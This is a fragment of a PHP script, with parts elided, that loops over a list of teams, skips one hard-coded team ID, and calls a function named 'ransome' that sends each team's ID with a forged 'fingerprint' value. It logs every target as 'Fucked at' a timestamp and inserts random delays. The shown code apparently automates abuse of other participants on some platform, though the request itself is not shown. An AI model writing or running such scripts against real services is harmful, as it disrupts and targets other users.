...
function ransome($team_id, $team_name, $do_fuck = "")
{
    if ($team_id == "1110805") {
        return;
    }
    ...
    $dataX = [
        "team_id" => $team_id,
        "fingerprint" => generateFingerprint() . $do_fuck
    ];
    ...
    // echo current time first

    echo date("Y-m-d H:i:s") . "\n" . $team_id . ":\t" . $team_name . "\n";
    echo $response;
    echo "\n";
    echo "\n";
    // randomly sleep between 0 to 1 seconds
...
foreach ($teamsArr as $team) {
    $fetch_start = time();
    $result .= $team['team_id'] . ":\t" . $team['team_name'] . ": Fucked at " . date("Y-m-d H:i:s") . "\n";
    ransome($team['team_id'], $team['team_name'], "yes");
    $end_time = time();
    $result .= "TooK: ".($end_time - $fetch_start)."s\tTill now:" . ($end_time - $start_time) . " seconds\n";
    $result .= "--------------------------\n";
    echo $result;
}
$result .= "Total time taken: " . ($end_time - $start_time) . " seconds\n";
$result .= "Ended at " . date("Y-m-d H:i:s", $end_time) . "\n\n\n";

if (!file_exists(__DIR__ . "/ransome-logs")) {
    mkdir(__DIR__ . "/ransome-logs", 0777, true);
}
file_put_contents(__DIR__ . "/ransome-logs/". date("y-m-d-H-i-s") .".txt", $result, FILE_APPEND);